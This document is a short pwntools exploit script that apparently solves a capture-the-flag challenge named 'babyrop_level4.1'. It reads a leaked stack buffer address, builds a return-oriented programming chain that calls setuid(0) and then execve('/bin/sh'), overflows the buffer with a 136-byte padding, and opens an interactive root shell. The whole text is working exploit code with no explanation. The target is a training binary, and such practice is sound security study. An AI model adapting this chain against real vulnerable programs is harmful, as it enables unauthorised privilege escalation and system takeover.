from pwn import *

elf = ELF('/challenge/babyrop_level4.1')
rop = ROP(elf)

proc = process('/challenge/babyrop_level4.1')
proc.recvuntil(b'[LEAK] Your input buffer is located at: ')
addr_buff = int(proc.recvline().strip().decode()[:-1], 16)
print(f'addr buff: {hex(addr_buff)}')

pop_rax = rop.rax.address
pop_rdi = rop.rdi.address
pop_rsi = rop.rsi.address
pop_rdx = rop.rdx.address
syscall = rop.syscall.address

binsh_addr = addr_buff + 252
rop.raw(p64(pop_rax))
rop.raw(p64(0x69))
rop.raw(p64(pop_rdi))
rop.raw(p64(0x0))
rop.raw(p64(syscall))

rop.raw(p64(pop_rax))
rop.raw(p64(0x3b))
rop.raw(p64(pop_rdi))
rop.raw(p64(binsh_addr))
rop.raw(p64(pop_rsi))
rop.raw(p64(0x0))
rop.raw(p64(pop_rdx))
rop.raw(p64(0x0))
rop.raw(p64(syscall))

offset_ret = 136
payload = b'A' * (offset_ret) + rop.chain() +  b'BBBB' + b"/bin/sh\x00"
print(rop.dump())

print(proc.recvuntil(b'\n'))
proc.send(payload)
proc.interactive()
